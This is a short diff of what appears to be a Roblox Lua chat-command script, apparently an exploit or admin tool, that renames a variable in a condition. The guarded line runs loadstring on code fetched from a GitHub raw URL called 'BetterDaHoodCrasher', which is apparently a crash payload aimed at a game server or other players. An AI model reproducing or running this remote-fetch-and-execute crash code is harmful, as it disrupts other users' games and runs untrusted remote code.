@@ -94,7 +94,7 @@ local function onChatted(p,msg)
             game:GetService("RunService"):Set3dRenderingEnabled(true)
         end
         if msg == prefix.."crash" then
-            if player.name == crash then
+            if player.name == crasher then
                 loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
             end
         end
